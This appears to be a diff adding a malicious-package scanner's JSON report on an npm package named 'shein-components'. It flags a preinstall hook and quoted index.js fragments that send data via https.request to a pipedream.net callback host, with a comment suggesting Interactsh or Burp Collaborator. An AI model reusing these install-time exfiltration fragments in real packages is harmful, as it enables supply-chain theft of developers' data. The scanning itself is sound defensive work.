@@ -1,0 +1,39 @@
+{
+    "issues": 4,
+    "errors": {},
+    "results": {
+        "npm-steganography": {},
+        "npm-exec-base64": {},
+        "npm-silent-process-execution": {},
+        "npm-exfiltrate-sensitive-data": [
+            {
+                "location": "package/index.js:36",
+                "code": "var req = https.request(options, (res) => {\n    res.on(\"data\", (d) => {\n        process.stdout.write(d);\n    });\n});\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            },
+            {
+                "location": "package/index.js:46",
+                "code": "req.write(postData);\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            }
+        ],
+        "npm-serialize-environment": {},
+        "npm-install-script": [
+            {
+                "location": "package/package.json:8",
+                "code": "\t\t\"preinstall\": \"node index.js\"\n",
+                "message": "The package.json has a script automatically running when the package is installed"
+            }
+        ],
+        "npm-obfuscation": {},
+        "shady-links": [
+            {
+                "location": "package/index.js:26",
+                "code": "    hostname: \"381fc1e709e4494a86f8343fe564ab4a.m.pipedream.net\", //replace pipedream with Interactsh or burpcollaborator.net\n",
+                "message": "This package contains an URL to a domain with a suspicious extension"
+            }
+        ],
+        "npm-dll-hijacking": {}
+    },
+    "path": "./dataset/npm/shein-components-1.0.0"
+}
